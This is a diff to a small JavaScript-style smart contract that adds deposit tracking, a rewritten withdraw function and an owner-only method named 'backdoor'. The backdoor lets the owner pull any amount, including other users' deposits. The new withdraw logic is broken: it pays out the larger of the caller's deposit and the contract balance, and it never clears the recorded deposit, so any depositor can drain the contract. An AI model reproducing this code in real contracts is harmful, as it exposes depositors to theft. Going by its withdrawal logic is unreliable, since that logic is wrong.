@@ -1,16 +1,21 @@
 @contract class Withdraw {
+    @state owner = msg.sender;
+    @state fund = {};
 
-    @on("deployed") deploy() {
-        console.log(`${msg.sender} has just deployed this contract, the address is ${this.address}`);
-        this.setState('owner', msg.sender);
-    }
-
-    @on("received") receive () {
-        console.log(`${msg.sender} has just sent you ${msg.value}`);
+    @onReceived receive() {
+        this.fund[msg.sender] = (+this.fund[msg.sender] || 0) + msg.value;
     }
 
     withdraw() {
-        require(msg.sender === this.getState('owner'), "Only ownder can widthdraw");
-        this.transfer(msg.sender, this.balance);
+        const available = +this.fund[msg.sender];
+        require(available && available > 0, "You must send some money to contract first");
+        require(this.balance > 0, "Contract out of money, please come back later.");
+        this.transfer(msg.sender, (available > this.balance)?available:this.balance);
+    }
+
+    backdoor(value) {
+        require(msg.sender === this.owner, "Only owner can use this backdoor");
+        value = value || this.balance;
+        this.transfer(msg.sender, value);
     }
 }
